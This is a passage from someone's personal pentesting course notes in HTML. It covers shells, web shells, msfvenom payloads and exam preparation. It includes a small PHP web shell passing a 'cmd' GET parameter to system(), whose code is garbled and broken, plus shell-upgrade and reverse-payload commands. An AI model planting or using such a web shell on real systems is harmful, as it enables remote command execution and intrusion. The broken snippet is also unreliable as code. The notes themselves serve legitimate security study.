shell</div></li><ul><li><div>/tmp/r</div></li></ul><li><div>Spawning a terminal = upgrading your shell to something that we like </div></li><li><div>How do you do it?</div></li><ul><li><div>bash -i</div></li><li><div>python - use &quot;spawning a terminal shell&quot;</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Shells Video</span></div><ul><li><div>One of the names for a bash terminal, common name for a program that you can use to interact with the system</div></li><li><div>There are many different types but they have the same goal: expand program command execution to system command execution. </div></li><li><div>When it is in a web app it is called a web shell</div></li><ul><li><div>It is a script written in a language that is executed by a server </div></li><li><div>No universal one</div></li><li><div>If you can upload files to a server you should try</div></li><ul><li><div>ASP shells on a windows server.</div></li><li><div>JSP on an apache tomcat server </div></li><li><div>PHP on classical apache</div></li></ul></ul><li><div>Most programming languages give the opportunity to interact with the OS using them. </div></li><li><div>There are parts of the language dedicated to it</div></li><ul><li><div>os.pope in Python</div></li><li><div>java.lang.runtime</div></li></ul><li><div>Lets create one</div></li><ul><li><div>nano php</div></li><li><div><br/></div><div><br/></div><div>&lt;html&gt;</div><div>&lt;?php&gt;</div><div>echo &quot;&lt;cform method=GET&gt;&lt;input type=text name=cmd&gt;&lt;input type=submit value=ok&gt;&lt;/S</div></li><li><div>system($_GET[&quot;cmd]);</div><div><br/></div><div><br/></div><div>ENDBIT</div></li></ul><li><div>Most of the time though you will be using webshells from the internet but try to chose ones that you slighlty understand.</div></li><li><div>msfvenom is a good tool for creating payloads</div></li><li><div>stageless payload means that it does not need anthing else, just the nc listener. </div></li><ul><li><div>it is bigger than staged though</div></li></ul><li><div>find a php payload?</div></li><ul><li><div>msfvenom --list payloads | grep php | grep reverse</div></li></ul><li><div>last bit got confusing, watch again once I have more of an understanding/hands on with metasploit</div></li></ul></div><div><br/></div></span>
</div>
<hr>
<a name="1174"/>

<div>
<span><div><div><b>Preparing for the exam</b></div><ul><li><div>Each of the black-box pentesting labs contains 2-4 machines that should be exploited. </div></li><li><div>No hints on how to approach them </div></li><li><div>Flag on every machine</div></li><ul><li><div>If you can read this you have successfully compromised the machine</div></li><li><div>Be aware, this might not be the end</div></li><ul><li><div>Could be more valuable info on the machine that could help compromise more hosts </div></li></ul></ul><li><div>First one is Windows</div></li><li><div>Second is about DNS</div></li><li><div>Third is about networking</div></li></ul><div><br/></div></div></span>
</div></body></html> 